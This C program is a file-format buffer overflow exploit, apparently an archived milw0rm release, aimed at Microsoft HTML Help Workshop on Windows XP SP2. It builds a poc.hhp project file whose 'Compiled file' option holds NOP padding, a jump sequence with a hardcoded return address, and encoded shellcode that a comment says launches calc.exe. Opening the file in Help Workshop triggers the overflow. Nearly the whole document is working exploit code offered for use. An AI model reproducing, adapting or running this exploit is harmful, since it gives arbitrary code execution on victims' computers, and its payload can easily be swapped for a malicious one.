/*
Microsoft HTML Help Workshop .hhp file Compiled File Header Buffer Overflow Exploit
The Buffer Overlfow in Compiled File in Options in a HHP file.

Bug found by:darkeagle
Exploit coded by:k3xji
Mail:sumerc@gmail.com
Web: www.guvenliklab.com

Tested:Win XP SP2
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFLEN 0xe6

char sta[]=
"[OPTIONS]\n"
"Compatibility=1.1 or later\n"
"Compiled file=";

char fin[]=
"Display compile progress=No\n"
"Language=Turkish\n\n\n"
"[INFOTYPES]";

char jmpcode[]= "\x5d\x38\x82\x7c\x5d\x38\x82\x7c\x90\x90\x90\x90\x83\xEC\x34\x90\x83\xEC\x78\x90\xFF\xE4\x90\x90";

char shellcode[]=
    //Taken from ATmaCA's Execute Calc.exe shellcode.Thx.A bit lazy to call ExitProcess:P
    "\x54\x50\x53\x50\x29\xc9\x83\xe9\xde\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x02"
    "\xdd\x0e\x4d\x83\xee\xfc\xe2\xf4\xfe\x35\x4a\x4d\x02\xdd\x85\x08\x3e\x56\x72\x48"
    "\x7a\xdc\xe1\xc6\x4d\xc5\x85\x12\x22\xdc\xe5\x04\x89\xe9\x85\x4c\xec\xec\xce\xd4"
    "\xae\x59\xce\x39\x05\x1c\xc4\x40\x03\x1f\xe5\xb9\x39\x89\x2a\x49\x77\x38\x85\x12"
    "\x26\xdc\xe5\x2b\x89\xd1\x45\xc6\x5d\xc1\x0f\xa6\x89\xc1\x85\x4c\xe9\x54\x52\x69"
    "\x06\x1e\x3f\x8d\x66\x56\x4e\x7d\x87\x1d\x76\x41\x89\x9d\x02\xc6\x72\xc1\xa3\xc6"
    "\x6a\xd5\xe5\x44\x89\x5d\xbe\x4d\x02\xdd\x85\x25\x3e\x82\x3f\xbb\x62\x8b\x87\xb5"
    "\x81\x1d\x75\x1d\x6a\xa3\xd6\xaf\x71\xb5\x96\xb3\x88\xd3\x59\xb2\xe5\xbe\x6f\x21"
    "\x61\xdd\x0e\x4d";

int main(int argc,char *argv[])
{

	printf("\nMicrosoft Help WorkShop Compiled File Header Buffer Overflow");
    printf("\nBug discovered by darkeagle");
	printf("\nExploit coded by k3xji");
    printf("\nE-Mail: sumerc@gmail.com");

	FILE *vuln;
	char *overflow;
	overflow = (char*)malloc(BUFLEN);	
	vuln = fopen("poc.hhp","w");

	//build overflow buffer here.
	memset(overflow,0x90,BUFLEN);					    //fill noPs
	memcpy(overflow+0x2a,shellcode,sizeof(shellcode));  //shellcod3
	memcpy(overflow+0xce,jmpcode,sizeof(jmpcode));      //jmpcod3
 
	if(vuln)
	{
		//Write to the poc.hhp file
		fprintf(vuln,"%s%s\"/>\n%s",sta,overflow,fin);
		fclose(vuln);
	}
	printf("\n\npoc.hhp file is written.\n");
	printf("Open file with Microsoft Help Workshop.\n");
	return 0;
}

// milw0rm.com [2006-02-11]
